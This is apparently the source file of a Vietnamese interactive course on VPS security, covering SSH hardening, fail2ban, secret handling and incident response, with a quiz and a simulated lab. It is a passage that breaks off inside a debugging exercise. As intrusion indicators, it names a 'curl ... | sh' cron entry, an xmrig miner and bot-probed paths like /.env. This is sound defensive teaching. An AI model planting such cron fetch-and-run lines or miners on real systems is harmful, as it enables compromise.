(function (G) {
'use strict';
var V = G.VPS, C = G.COURSE, L = C.L, M = C.M, ran = C.ran, B = C.B2, pick = C.pick2, pickQ = C.pickQ2;
function R(re) { return function (s) { return ran(s, re); }; }
var OWN = '203.0.113.7', BAD = '45.155.205.12';
function S(s) { return V.sec.S(s.W); }
function mode(s, p) { var n = s.fs.get(p); return n ? (n.mode & 511) : -1; }
function eff(s) { return V.sec.eff(s); }
function app(s) { return V.sec.applied(s); }
function banned(s, ip) { return s.W.f2b.banned.indexOf(ip) >= 0; }
function txt(s, p) { var n = s.fs.get(p); return n ? n.c : ''; }

/* ---------------- THEORY ---------------- */
B.theory = [
  { tag: 'Khái niệm', title: 'Vì sao không dùng root và cách tạo user thường', body: [
    'Tài khoản `root` có mọi quyền và là **tên bị dò nhiều nhất**. Quy tắc: dùng một user thường để đăng nhập (ở dự án này là `haidangphan`), cần quyền cao thì gọi `sudo` từng lệnh.',
    { tbl: [['Việc', 'Lệnh', 'Giải thích'],
      ['Tạo user', '`sudo adduser ops`', 'Tạo user, nhóm, thư mục `/home/ops` (hỏi mật khẩu)'],
      ['Tạo user chỉ dùng khoá', '`sudo adduser --disabled-password --gecos "" deploy`', 'Không có mật khẩu: chỉ vào bằng khoá SSH'],
      ['Cấp quyền sudo', '`sudo usermod -aG sudo ops`', '`-aG` = **thêm** vào nhóm, giữ nhóm cũ'],
      ['Xem nhóm', '`id ops`, `groups ops`, `getent group sudo`', 'Ai đang có quyền sudo'],
      ['Khoá/mở mật khẩu', '`sudo passwd -l ops`, `sudo passwd -u ops`', 'Khoá không cho đăng nhập bằng mật khẩu'],
      ['Xem quyền sudo', '`sudo -l -U ops`', 'Liệt kê user đó được chạy gì'],
      ['Xoá user', '`sudo deluser --remove-home ops`', 'Xoá cả thư mục home']] },
    { note: 'Gõ `usermod -G sudo ops` (thiếu `-a`) sẽ **ghi đè** mọi nhóm phụ của user. Luôn dùng `-aG`.', kind: 'warn' },
    { ul: ['Mỗi người, mỗi dịch vụ một user riêng; đừng dùng chung tài khoản', 'User chạy CI/CD (`deploy`) **không cần sudo**; chỉ cấp đúng những gì nó cần', 'Quyền sudo không cần mật khẩu: tạo file `/etc/sudoers.d/ops` với `ops ALL=(ALL) NOPASSWD:ALL`, `chmod 440`, rồi `sudo visudo -c` để kiểm tra cú pháp. Chỉ dùng cho tài khoản tự động hoá thật sự cần'] }
  ] },
  { tag: 'Cú pháp', title: 'Khoá SSH: tạo, phân phối và authorized_keys', body: [
    'Mỗi khoá gồm cặp: **khoá riêng** (ở máy bạn, tuyệt đối không chia sẻ) và **khoá công khai** (`.pub`, đặt lên máy chủ). Máy chủ đọc danh sách khoá công khai được tin cậy trong `~/.ssh/authorized_keys` của user.',
    { pre: ['ssh-keygen -t ed25519 -C "duong@laptop"                 # tạo cặp khoá (nên đặt passphrase)', 'ssh-copy-id -i ~/.ssh/id_ed25519.pub haidangphan@116.118.9.210   # đưa khoá công khai lên VPS', 'ssh-keygen -t ed25519 -f ~/.ssh/deploy_ci -C "github-actions" -N ""   # khoá riêng cho CI'], cap: 'Trên laptop' },
    { tbl: [['Đường dẫn', 'Quyền đúng', 'Chủ sở hữu'], ['`~/.ssh`', '`700`', 'chính user'], ['`~/.ssh/authorized_keys`', '`600`', 'chính user'], ['Khoá riêng `id_ed25519`', '`600`', 'chính user'], ['Khoá công khai `.pub`', '`644`', 'chính user']] },
    { note: 'sshd có `StrictModes`: nếu thư mục `~/.ssh` hay `authorized_keys` cho nhóm/người khác ghi, hoặc **thuộc user khác (thường do dùng `sudo nano`)**, sshd bỏ qua file và đăng nhập bằng khoá thất bại với `Permission denied (publickey)`. Dòng log: `Authentication refused: bad ownership or modes for directory`.', kind: 'warn' },
    { ul: ['Thêm khoá cho user khác: `sudo mkdir -p /home/deploy/.ssh`, ghi khoá vào `authorized_keys`, rồi `sudo chown -R deploy:deploy /home/deploy/.ssh`, `chmod 700`, `chmod 600`', 'Thu hồi khoá cũ (laptop mất, nhân viên nghỉ): xoá đúng dòng của nó bằng `sed -i \'/old-laptop/d\' ~/.ssh/authorized_keys`', 'Khoá cho CI/CD **riêng biệt**, một khoá một mục đích. Lộ khoá nào thu hồi khoá đó, không ảnh hưởng khoá của bạn', 'Có thể giới hạn khoá bằng tiền tố: `from="1.2.3.4",no-port-forwarding,no-pty ssh-ed25519 AAAA...`'] },
    { pre: ['Host vps', '    HostName 116.118.9.210', '    User haidangphan', '    IdentityFile ~/.ssh/id_ed25519', '    IdentitiesOnly yes', '', 'Host db-via-vps', '    HostName 127.0.0.1', '    ProxyJump vps'], cap: '~/.ssh/config: ProxyJump dùng VPS làm "trạm nhảy" tới máy chỉ có địa chỉ nội bộ' },
    'Passphrase bảo vệ khoá riêng khi laptop bị mất. `ssh-agent` giữ khoá đã mở khoá trong bộ nhớ để bạn không phải gõ lại: `eval "$(ssh-agent)"` rồi `ssh-add ~/.ssh/id_ed25519`.'
  ] },
  pick('Cứng hoá sshd_config an toàn'),
  { tag: 'Lưu ý', title: 'sshd: dòng đầu tiên thắng và thư mục sshd_config.d', body: [
    'sshd đọc cấu hình từ trên xuống và **giữ giá trị đầu tiên** của mỗi tuỳ chọn (ngoại trừ vài tuỳ chọn cộng dồn như `AllowUsers`). Dòng `Include /etc/ssh/sshd_config.d/*.conf` thường nằm **ngay đầu** file chính, nên file trong thư mục đó thắng mọi thứ viết bên dưới.',
    { pre: ['# /etc/ssh/sshd_config                       # bạn sửa dòng này thành no', 'Include /etc/ssh/sshd_config.d/*.conf', 'PasswordAuthentication no', '', '# /etc/ssh/sshd_config.d/50-cloud-init.conf   # nhà cung cấp VPS để lại', 'PasswordAuthentication yes                    # DÒNG NÀY THẮNG!'], cap: 'Cái bẫy phổ biến trên Ubuntu cloud image' },
    'Cách duy nhất chắc chắn biết cấu hình thực sự có hiệu lực là hỏi sshd:',
    { pre: ['sudo sshd -T | grep -E "permitrootlogin|passwordauthentication|port|allowusers|maxauthtries"'], cap: '-T in toàn bộ cấu hình đã gộp, chữ thường. Đây là nguồn sự thật' },
    { tbl: [['Tuỳ chọn', 'Gợi ý', 'Tác dụng'], ['`PermitRootLogin`', '`no`', 'Cấm root đăng nhập SSH'], ['`PasswordAuthentication`', '`no`', 'Chỉ nhận khoá'], ['`AllowUsers`', '`haidangphan deploy`', 'Chỉ danh sách này được SSH, ai khác bị từ chối kể cả mật khẩu đúng'], ['`MaxAuthTries`', '`3`', 'Số lần thử trong **một** kết nối (mặc định 6)'], ['`LoginGraceTime`', '`30`', 'Chờ đăng nhập tối đa 30 giây (mặc định 120)'], ['`X11Forwarding`', '`no`', 'Không cần cho server'], ['`ClientAliveInterval`', '`300`', 'Dọn phiên treo']] },
    { note: 'Sau khi sửa: `sudo sshd -t` (cú pháp), `sudo sshd -T | grep ...` (xác nhận), `sudo systemctl reload ssh`, rồi **mở phiên SSH mới để thử** trước khi đóng phiên cũ.', kind: 'tip' }
  ] },
  { tag: 'Quy trình', title: 'Đổi cổng SSH an toàn', body: [
    'Đổi cổng 22 sang cổng lạ (ví dụ 2222) giúp nhật ký bớt rác từ bot, nhưng **không phải biện pháp bảo mật thật sự**: khoá SSH và fail2ban mới là bảo vệ. Nếu đổi, hãy làm đúng thứ tự:',
    { pre: ['sudo ufw allow 2222/tcp                          # 1. MỞ cổng mới trước', "sudo sed -i 's/^Port 22$/Port 2222/' /etc/ssh/sshd_config   # 2. đổi cấu hình", 'sudo sshd -t && sudo systemctl restart ssh     # 3. áp dụng', 'sudo ss -tlnp | grep sshd                      # 4. xác nhận đang nghe 2222', 'ssh -p 2222 haidangphan@116.118.9.210          # 5. THỬ từ cửa sổ khác, GIỮ phiên cũ', 'sudo ufw delete allow OpenSSH                  # 6. chỉ xoá cổng 22 khi bước 5 thành công'], cap: 'Sáu bước' },
    { note: 'Quên bước 1 là tự khoá mình. Đường cứu duy nhất là **console web của nhà cung cấp VPS**. Hãy biết cách mở nó trước khi cần.', kind: 'warn' },
    'Thêm `Port 2222` vào `~/.ssh/config` của laptop để khỏi gõ `-p 2222` mỗi lần.'
  ] },
  pick('Fail2ban hoạt động thế nào'),
  { tag: 'Cú pháp', title: 'Cấu hình fail2ban với jail.local', body: [
    'Không sửa `/etc/fail2ban/jail.conf` (bị ghi đè khi cập nhật). Hãy tạo `/etc/fail2ban/jail.local` chỉ chứa phần bạn muốn đổi:',
    { pre: ['[DEFAULT]', 'ignoreip = 127.0.0.1/8 ::1 203.0.113.7    # IP KHÔNG BAO GIỜ bị chặn: IP của bạn', 'bantime  = 1h                          # chặn bao lâu', 'findtime = 10m                         # cửa sổ đếm', '', '[sshd]', 'enabled  = true', 'maxretry = 3                           # sai 3 lần trong findtime thì chặn'], cap: '/etc/fail2ban/jail.local' },
    { tbl: [['Tham số', 'Nghĩa', 'Ví dụ'], ['`maxretry`', 'Số lần thất bại cho phép', '`3`'], ['`findtime`', 'Khoảng thời gian đếm số lần', '`10m`'], ['`bantime`', 'Thời gian chặn', '`1h`, `1d`, `-1` (vĩnh viễn)'], ['`ignoreip`', 'IP/dải được miễn', 'IP nhà, văn phòng, VPN'], ['`bantime.increment`', 'Tăng dần thời gian chặn với kẻ tái phạm', '`true`']] },
    { pre: ['sudo fail2ban-client reload                     # nạp cấu hình mới', 'sudo fail2ban-client get sshd maxretry          # xác nhận giá trị', 'sudo fail2ban-client get sshd ignoreip', 'sudo fail2ban-client status sshd                  # ai đang bị chặn', 'sudo fail2ban-client set sshd unbanip 1.2.3.4     # gỡ chặn', 'sudo fail2ban-client set sshd banip 1.2.3.4       # chặn tay'] },
    { note: 'Nên có `ignoreip` ngay từ đầu. Gõ sai mật khẩu vài lần khi mệt là có thể tự bị chặn khỏi VPS của chính mình.', kind: 'warn' },
    'Mở rộng: jail cho Nginx (`[nginx-http-auth]`, `[nginx-botsearch]`) chặn bot quét `/wp-login.php`, `/.env`; jail `recidive` chặn lâu những IP bị chặn nhiều lần.'
  ] },
  pick('Đọc auth.log để biết ai đang gõ cửa'),
  { tag: 'Bảng tra', title: 'Ai đã đăng nhập: last, w, lastb, auth.log', body: [
    { tbl: [['Lệnh', 'Cho biết'], ['`last -n 10`', '10 lần đăng nhập thành công gần nhất: user, IP, giờ. IP lạ = báo động'], ['`w`, `who`', 'Ai đang đăng nhập NGAY BÂY GIỜ và đang chạy gì'], ['`sudo lastb | head`', 'Các lần đăng nhập thất bại'], ['`sudo grep Accepted /var/log/auth.log`', 'Đăng nhập thành công, kèm cách xác thực (`publickey` hay `password`)'], ['`sudo grep "Failed password" /var/log/auth.log | wc -l`', 'Tổng số lần dò mật khẩu'], ['`sudo journalctl -u ssh --since "1 hour ago"`', 'Nhật ký dịch vụ ssh theo thời gian']] },
    { note: 'Dòng `Accepted password for ...` trên server đã bắt buộc khoá là **dấu hiệu nghiêm trọng**: mật khẩu vẫn đang được chấp nhận ở đâu đó (xem lại `sshd -T`).', kind: 'warn' }
  ] },
  { tag: 'Quy trình', title: 'Giữ bí mật: file .env, token, khoá', body: [
    { tbl: [['Nên', 'Không nên'], ['`.env` và `docker.env` quyền `600`, chủ là user chạy ứng dụng', 'File bí mật nằm trong thư mục Nginx phục vụ (`/var/www/html/.env`)'], ['Thêm `.env*` vào `.gitignore`; thêm `.dockerignore`', 'Commit `.env` hoặc dán mật khẩu vào chat/issue'], ['Mỗi môi trường một bộ bí mật', 'Dùng chung mật khẩu dev và production'], ['Xoay (đổi) bí mật định kỳ và khi nghi lộ', 'Chỉ xoá file mà không đổi giá trị đã lộ']] },
    { pre: ['ls -l ~/tutor/gateway/docker.env             # -rw------- là đúng', 'chmod 600 ~/tutor/gateway/docker.env', 'grep -c PASSWORD ~/tutor/gateway/docker.env    # đếm dòng mà không in mật khẩu ra màn hình', 'sudo grep "/.env" /var/log/nginx/access.log  # có bot nào đã thử đọc .env chưa?'] },
    { note: 'Quy tắc vàng: **bí mật đã lộ coi như đã mất**. Việc đầu tiên là đổi giá trị (xoay), sau đó mới dọn dẹp file. Nếu mật khẩu DB nằm trong file bị lộ, đổi cả trong Postgres (`ALTER USER`) lẫn `docker.env` rồi `up -d`.', kind: 'warn' },
    'Truy cập `/.env`, `/.git/config`, `/wp-login.php` nằm trong số các đường dẫn bot quét nhiều nhất. Nginx nên chỉ phục vụ thư mục build công khai, không bao giờ để bí mật trong đó.'
  ] },
  { tag: 'Quy trình', title: 'Dấu hiệu bị xâm nhập và quy trình ứng phó', body: [
    { tbl: [['Dấu hiệu', 'Kiểm tra'], ['CPU luôn 100%, quạt gió, VPS chậm', '`ps aux --sort=-%cpu | head`, `top`'], ['Đăng nhập từ IP/giờ lạ', '`last -n 20`, `sudo grep Accepted /var/log/auth.log`'], ['Khoá SSH lạ', '`cat ~/.ssh/authorized_keys` (kiểm tra cả của root và user khác)'], ['Cron lạ (thường `curl ... | sh`)', '`crontab -l`, `sudo crontab -l`, `ls /etc/cron.d`'], ['Tiến trình lạ chạy từ thư mục ẩn', '`ps aux | grep -E "\\.cache|/tmp"`'], ['Cổng lạ mở', '`sudo ss -tlnp`'], ['Gói/băng thông ra bất thường', 'Biểu đồ mạng của nhà cung cấp VPS']] },
    'Quy trình ứng phó, theo thứ tự:',
    { ul: ['**Giữ bằng chứng**: sao chép `auth.log`, `last`, `ps aux` ra file trước khi dọn', '**Chặn đường vào**: tắt đăng nhập mật khẩu, thu hồi khoá lạ, chặn IP', '**Dừng thứ độc hại**: `kill` tiến trình, gỡ cron và file lạ', '**Xoay mọi bí mật** đã nằm trên máy: mật khẩu DB, token API, khoá deploy', '**Tìm đường vào gốc** (mật khẩu yếu, lỗ hổng ứng dụng, bí mật lộ) và vá nó', '**Cân nhắc cài lại VPS** từ bản sạch nếu bị chiếm quyền root: dọn tay không bao giờ chắc chắn tuyệt đối'] },
    { pre: ['last -n 10', 'ps aux | grep xmrig', 'kill 3317', "crontab -l | grep -v 'x.sh' | crontab -        # giữ cron hợp lệ, bỏ dòng xấu", "sed -i '/unknown@kali/d' ~/.ssh/authorized_keys"], cap: 'Ví dụ dọn dẹp (bài c2d6)' }
  ] },
  { tag: 'Bảng tra', title: 'Bảng triệu chứng SSH và đăng nhập', body: [
    { tbl: [['Triệu chứng', 'Nguyên nhân hay gặp', 'Kiểm tra'],
      ['`Permission denied (publickey)`', 'Quyền/chủ sở hữu `.ssh`, `authorized_keys` sai; khoá sai; user không có trong `AllowUsers`', '`ls -la ~/.ssh`, `grep refused /var/log/auth.log`'],
      ['`Connection timed out`', 'ufw/tường lửa nhà cung cấp chặn; IP bị fail2ban chặn; cổng sai', '`ufw status`, `fail2ban-client status sshd`'],
      ['`Connection refused`', 'sshd không chạy hoặc đang nghe cổng khác', '`ss -tlnp | grep sshd`'],
      ['Sửa sshd_config nhưng không đổi gì', 'File trong `sshd_config.d` thắng; chưa reload', '`sshd -T`, `systemctl reload ssh`'],
      ['`reload` báo lỗi', 'Gõ sai tên tuỳ chọn', '`sshd -t`'],
      ['Bot vẫn dò mật khẩu hằng giờ', 'Bình thường: dò vô ích nếu đã tắt mật khẩu', '`sshd -T | grep passwordauth`'],
      ['Mất khoá riêng/laptop', 'Cần thu hồi khoá', 'Xoá dòng trong `authorized_keys`, tạo khoá mới']] }
  ] },
  { tag: 'Quy trình', title: 'Danh sách kiểm tra cuối chương: SSH và ứng phó', body: [
    { ul: ['Đăng nhập bằng user thường; `PermitRootLogin no`', '`sshd -T` xác nhận `passwordauthentication no`, có `allowusers`, `maxauthtries 3`', '`~/.ssh` là `700`, `authorized_keys` là `600`, đều thuộc đúng user', 'Mỗi người/dịch vụ một khoá; đã thu hồi khoá cũ', 'fail2ban có `jail.local` với `ignoreip` là IP của bạn', 'File `.env` quyền `600`, nằm ngoài thư mục web, đã xoay khi nghi lộ', 'Biết đường cứu hộ: console nhà cung cấp VPS', 'Xem `last` và `authorized_keys` định kỳ; có sao lưu cấu hình sshd và ufw'] },
    'Hoàn thành hai chương Bảo mật cùng với chương Giám sát và log, bạn đã có đủ bộ ba: **phòng thủ**, **phát hiện** và **ứng phó**.'
  ] }
];

/* ---------------- QUIZ ---------------- */
B.quiz = [
  pickQ('Sau khi sửa sshd_config'),
  { q: 'Vì sao nên tạo user thường (có sudo) và cấm `root` đăng nhập SSH?', opts: ['Vì root không dùng được SSH', 'Root là tên bị dò nhiều nhất và có mọi quyền; user thường buộc kẻ tấn công phải biết thêm một tên và qua sudo', 'Để tiết kiệm RAM', 'Vì Ubuntu yêu cầu'], ans: 1, why: 'Giảm bề mặt tấn công và để mọi hành động quyền cao đi qua sudo (có ghi log).' },
  { q: 'Bạn gõ `sudo usermod -G sudo ops` (không có `-a`). Hậu quả?', opts: ['Thêm ops vào nhóm sudo như mong muốn', 'Ghi đè: ops chỉ còn nhóm sudo, mất mọi nhóm phụ khác', 'Xoá user ops', 'Không có tác dụng'], ans: 1, why: '`-G` thay toàn bộ danh sách nhóm phụ. `-aG` mới là nối thêm.' },
  { q: 'Trong sshd_config, `PasswordAuthentication no` nằm dưới dòng Include, nhưng file `sshd_config.d/50-cloud-init.conf` có `PasswordAuthentication yes`. Giá trị hiệu lực?', opts: ['no (dòng cuối thắng)', 'yes (sshd giữ giá trị đầu tiên, và Include nằm trước)', 'Báo lỗi', 'Tuỳ ngẫu nhiên'], ans: 1, why: 'sshd lấy giá trị gặp đầu tiên. Dùng `sudo sshd -T | grep passwordauthentication` để xác nhận.' },
  { q: 'Lệnh nào cho biết CẤU HÌNH THỰC SỰ có hiệu lực của sshd?', opts: ['cat /etc/ssh/sshd_config', 'sudo sshd -T', 'sudo sshd -t', 'ssh -V'], ans: 1, why: '-T in cấu hình đã gộp mọi Include; -t chỉ kiểm tra cú pháp.' },
  { q: 'Đăng nhập khoá SSH thất bại, log có `bad ownership or modes for directory /home/u/.ssh`. Cách sửa?', opts: ['Tắt StrictModes', '`chown` đúng user, `chmod 700 ~/.ssh`, `chmod 600 authorized_keys`', 'Đổi cổng SSH', 'Cài lại sshd'], ans: 1, why: 'StrictModes yêu cầu thư mục và file không cho nhóm/người khác ghi và thuộc đúng user. Đừng tắt StrictModes.' },
  { q: 'Thứ tự an toàn khi đổi cổng SSH sang 2222?', opts: ['Restart sshd, rồi mới mở ufw', 'ufw allow 2222/tcp, đổi Port, `sshd -t`, restart, thử phiên mới, rồi mới xoá luật cũ', 'Xoá luật 22 trước cho gọn', 'Tắt ufw'], ans: 1, why: 'Mở cổng mới trước và giữ cổng cũ tới khi đã đăng nhập thử thành công bằng cổng mới.' },
  { q: '`ignoreip` trong fail2ban dùng để làm gì?', opts: ['Chặn IP vĩnh viễn', 'Liệt kê IP không bao giờ bị chặn (như IP của bạn)', 'Bỏ qua mọi lỗi', 'Ghi log IP'], ans: 1, why: 'Tránh tự khoá mình khi gõ sai mật khẩu hoặc khi script lỗi.' },
  { q: 'Gỡ chặn IP nhà bạn bằng `unbanip`, nhưng vài phút sau lại bị chặn. Thiếu bước nào?', opts: ['Reboot VPS', 'Thêm IP vào `ignoreip` trong jail.local và `fail2ban-client reload`', 'Tắt ufw', 'Đổi cổng SSH'], ans: 1, why: 'unbanip chỉ gỡ lần chặn hiện tại; ignoreip mới ngăn bị chặn lại.' },
  { q: 'Phát hiện file `.env` nằm trong thư mục Nginx phục vụ và log có bot `GET /.env 200`. Việc ĐẦU TIÊN?', opts: ['Xoá file là xong', 'Coi mọi bí mật trong file là đã lộ: xoay chúng, rồi di chuyển file ra ngoài thư mục web và chmod 600', 'Tắt Nginx vĩnh viễn', 'Đổi tên file thành .env2'], ans: 1, why: 'Xoá file không thu hồi được giá trị đã bị tải về. Phải đổi bí mật.' },
  { q: 'Dấu hiệu nào KHÔNG phải của việc bị xâm nhập?', opts: ['Dòng cron `*/5 * * * * curl ... | sh` mà bạn không viết', 'Dòng lạ trong authorized_keys', 'Hàng trăm dòng "Failed password" trong auth.log khi đã tắt mật khẩu', 'Tiến trình lạ ngốn CPU từ thư mục ~/.cache'], ans: 2, why: 'Dò mật khẩu thất bại là nền tiếng ồn bình thường. Ba dấu hiệu còn lại là thứ kẻ tấn công để lại sau khi thành công.' },
  { q: 'Vì sao khoá SSH cho CI/CD nên tạo riêng, gắn với user `deploy` không sudo?', opts: ['Để nhanh hơn', 'Khi lộ thì thu hồi đúng khoá đó và thiệt hại bị giới hạn', 'Vì CI không dùng được khoá cá nhân', 'Không có lý do'], ans: 1, why: 'Nguyên tắc đặc quyền tối thiểu và khả năng thu hồi độc lập.' },
  { q: '`AllowUsers haidangphan deploy` trong sshd_config có tác dụng gì?', opts: ['Cấp sudo cho hai user', 'Chỉ hai user này được SSH vào, mọi user khác bị từ chối kể cả có mật khẩu/khoá đúng', 'Tạo hai user', 'Cho phép đăng nhập không mật khẩu'], ans: 1, why: 'AllowUsers là danh sách trắng cho đăng nhập SSH.' }
];

/* ---------------- LAB ---------------- */
B.lab = {
  host: 'vps', user: 'haidangphan',
  setup: function (s) {
    C.secBase(s, { akMode: '644', sshMode: '775' });
    C.gateway(s, { up: true });
    s.fs.get(s.home + '/tutor/gateway/docker.env').mode = M('644');
  },
  items: [
    { text: 'Tạo user `ops` chỉ dùng khoá (không mật khẩu): `adduser --disabled-password --gecos ""`.', hint: 'sudo adduser --disabled-password --gecos "" ops', check: function (s) { return !!S(s).users.ops; } },
    { text: 'Cấp quyền sudo cho `ops` (nhớ `-aG`).', hint: 'sudo usermod -aG sudo ops', check: function (s) { return !!S(s).users.ops && S(s).users.ops.sudo; } },
    { text: 'Xem nhóm của `ops` bằng `id`.', hint: 'id ops', check: R(/^id ops/) },
    { text: 'Liệt kê ai đang thuộc nhóm `sudo`.', hint: 'getent group sudo', check: R(/^getent group sudo/) },
    { text: 'Tạo user `deploy` cho CI, cũng không mật khẩu.', hint: 'sudo adduser --disabled-password --gecos "" deploy', check: function (s) { return !!S(s).users.deploy; } },
    { text: 'Xác nhận `deploy` KHÔNG có quyền sudo.', hint: 'sudo -l -U deploy', check: R(/^sudo -l -U deploy/) },
    { text: 'Xem quyền và chủ sở hữu trong `~/.ssh` (kể cả file ẩn).', hint: 'ls -la ~/.ssh', check: R(/^ls -la? .*\.ssh/) },
    { text: 'Thư mục `~/.ssh` đang quá rộng (775). Đặt quyền đúng: 700.', hint: 'chmod 700 ~/.ssh', check: function (s) { return mode(s, s.home + '/.ssh') === M('700'); } },
    { text: '`authorized_keys` đang 644. Đặt quyền đúng: 600.', hint: 'chmod 600 ~/.ssh/authorized_keys', check: function (s) { return mode(s, s.home + '/.ssh/authorized_keys') === M('600'); } },
    { text: 'Đọc `authorized_keys` để xem những khoá nào đang được tin cậy.', hint: 'cat ~/.ssh/authorized_keys', check: R(/^cat .*authorized_keys/) },
    { text: 'Thu hồi khoá của laptop cũ (dòng có `old-laptop`), giữ nguyên khoá chính.', hint: "sed -i '/old-laptop/d' ~/.ssh/authorized_keys", check: function (s) { var t = txt(s, s.home + '/.ssh/authorized_keys'); return t.length > 0 && !/old-laptop/.test(t) && /duong@laptop/.test(t); } },
    { text: 'Tạo khoá riêng cho CI: ed25519, file `~/.ssh/deploy_ci`, chú thích `github-actions`, không passphrase (`-N ""`).', hint: 'ssh-keygen -t ed25519 -f ~/.ssh/deploy_ci -C github-actions -N ""', check: function (s) { return s.fs.isF(s.home + '/.ssh/deploy_ci.pub'); } },
    { text: 'Cài khoá công khai đó cho user `deploy`: tạo `.ssh`, ghi `authorized_keys`, chown cho `deploy`, quyền 700/600.', hint: 'sudo mkdir -p /home/deploy/.ssh && cat ~/.ssh/deploy_ci.pub | sudo tee -a /home/deploy/.ssh/authorized_keys && sudo chown -R deploy:deploy /home/deploy/.ssh && sudo chmod 700 /home/deploy/.ssh && sudo chmod 600 /home/deploy/.ssh/authorized_keys', check: function (s) { var d = s.fs.get('/home/deploy/.ssh'), f = s.fs.get('/home/deploy/.ssh/authorized_keys'); return !!d && !!f && /github-actions/.test(f.c) && d.owner === 'deploy' && f.owner === 'deploy' && (d.mode & 511) === M('700') && (f.mode & 511) === M('600'); } },
    { text: 'Xem cấu hình sshd THỰC SỰ có hiệu lực (lọc `permitrootlogin|passwordauthentication|port`).', hint: 'sudo sshd -T | grep -E "permitrootlogin|passwordauthentication|port"', check: R(/^grep -E .*passwordauthentication/) },
    { text: 'Tắt đăng nhập mật khẩu THẬT SỰ: nhớ cả file trong `sshd_config.d`. `sshd -T` phải ra `passwordauthentication no`.', hint: "sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config.d/50-cloud-init.conf && sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config", check: function (s) { return eff(s).passwordauthentication === 'no'; } },
    { text: 'Chỉ cho `haidangphan` và `deploy` SSH: thêm dòng `AllowUsers` vào cuối sshd_config (dùng `tee -a`).', hint: 'echo "AllowUsers haidangphan deploy" | sudo tee -a /etc/ssh/sshd_config', check: function (s) { var a = eff(s).allowusers || []; return a.indexOf('haidangphan') >= 0 && a.indexOf('deploy') >= 0; } },
    { text: 'Siết thử đăng nhập: `MaxAuthTries 3` và `LoginGraceTime 30` (hai dòng thêm vào cuối file).', hint: 'echo "MaxAuthTries 3" | sudo tee -a /etc/ssh/sshd_config && echo "LoginGraceTime 30" | sudo tee -a /etc/ssh/sshd_config', check: function (s) { var e = eff(s); return e.maxauthtries === '3' && e.logingracetime === '30'; } },
    { text: 'Kiểm tra cú pháp rồi reload để ÁP DỤNG (`sshd -t && systemctl reload ssh`).', hint: 'sudo sshd -t && sudo systemctl reload ssh', check: function (s) { var a = app(s); return a.passwordauthentication === 'no' && a.maxauthtries === '3' && (a.allowusers || []).indexOf('deploy') >= 0; } },
    { text: 'Xác nhận lại bằng `sshd -T` (lọc `allowusers|maxauthtries`).', hint: 'sudo sshd -T | grep -E "allowusers|maxauthtries"', check: R(/^grep -E .*allowusers/) },
    { text: 'Tạo `/etc/fail2ban/jail.local`: `ignoreip` có IP của bạn (203.0.113.7), `bantime = 1h`, jail sshd `maxretry = 3`.', hint: 'echo -e "[DEFAULT]\\nignoreip = 127.0.0.1/8 203.0.113.7\\nbantime = 1h\\n\\n[sshd]\\nenabled = true\\nmaxretry = 3" | sudo tee /etc/fail2ban/jail.local', check: function (s) { var t = txt(s, '/etc/fail2ban/jail.local'); return /ignoreip\s*=.*203\.0\.113\.7/.test(t) && /maxretry\s*=\s*3/.test(t); } },
    { text: 'Nạp cấu hình mới: `fail2ban-client reload`.', hint: 'sudo fail2ban-client reload', check: function (s) { var c = s.W.f2b.cfg; return !!c && c.maxretry === 3 && c.ignoreip.indexOf(OWN) >= 0; } },
    { text: 'Xác nhận danh sách IP được miễn (`get sshd ignoreip`).', hint: 'sudo fail2ban-client get sshd ignoreip', check: R(/^sudo fail2ban-client get sshd ignoreip/) },
    { transient: true, text: 'Chặn tay thử IP `198.51.100.9` bằng `set sshd banip`.', hint: 'sudo fail2ban-client set sshd banip 198.51.100.9', check: function (s) { return banned(s, '198.51.100.9'); } },
    { text: 'Gỡ chặn IP đó bằng `unbanip`.', hint: 'sudo fail2ban-client set sshd unbanip 198.51.100.9', check: function (s) { return ran(s, /unbanip 198\.51\.100\.9/) && !banned(s, '198.51.100.9'); } },
    { text: 'Xem 5 lần đăng nhập thành công gần nhất.', hint: 'last -n 5', check: R(/^last /) },
    { text: 'Xem ai đang đăng nhập ngay bây giờ.', hint: 'w', check: R(/^w$/) },
    { text: 'Lập lịch backup 02:30 hằng ngày: ghi dòng cron vào `~/mycron` rồi nạp bằng `crontab ~/mycron`.', hint: 'echo "30 2 * * * /home/haidangphan/backup.sh" > ~/mycron && crontab ~/mycron', check: function (s) { return (S(s).cron.haidangphan || []).some(function (l) { return /^30 2 \* \* \*/.test(l); }); } },
    { text: 'Liệt kê cron của bạn để kiểm tra.', hint: 'crontab -l', check: R(/^crontab -l/) },
    { text: 'Xem quyền file chứa mật khẩu `docker.env` (đang 644, quá rộng).', hint: 'ls -l ~/tutor/gateway/docker.env', check: R(/^ls -l .*docker\.env/) },
    { text: 'Đặt quyền 600 cho `docker.env`.', hint: 'chmod 600 ~/tutor/gateway/docker.env', check: function (s) { return mode(s, s.home + '/tutor/gateway/docker.env') === M('600'); } },
    { text: 'Đếm số dòng PASSWORD trong `docker.env` mà không in mật khẩu ra.', hint: 'grep -c PASSWORD ~/tutor/gateway/docker.env', check: R(/^grep -c PASSWORD/) },
    { text: 'Kiểm tra cú pháp sudoers: `visudo -c`.', hint: 'sudo visudo -c', check: R(/^sudo visudo -c/) },
    { text: 'Đổi cổng SSH, bước 1: MỞ cổng mới `2222/tcp` trong ufw.', hint: 'sudo ufw allow 2222/tcp', check: function (s) { return s.W.ufw.rules.some(function (r) { return r.to === '2222/tcp' && r.action === 'ALLOW'; }); } },
    { text: 'Bước 2: đổi `Port 22` thành `Port 2222` trong sshd_config.', hint: "sudo sed -i 's/^Port 22$/Port 2222/' /etc/ssh/sshd_config", check: function (s) { return eff(s).port === '2222'; } },
    { text: 'Bước 3: kiểm tra cú pháp và restart ssh.', hint: 'sudo sshd -t && sudo systemctl restart ssh', check: function (s) { return s.W.ssh.activePort === 2222; } },
    { text: 'Bước 4: xác nhận sshd đang nghe cổng 2222.', hint: 'sudo ss -tlnp | grep 2222', check: R(/^grep 2222/) }
  ]
};

/* ---------------- DEBUGS ---------------- */
B.debugs = [
  C.pickD2('c2d2'),
  {
    id: 'c2d4', title: 'Khoá SSH đúng nhưng vẫn Permission denied (publickey)',
    host: 'vps', user: 'haidangphan',
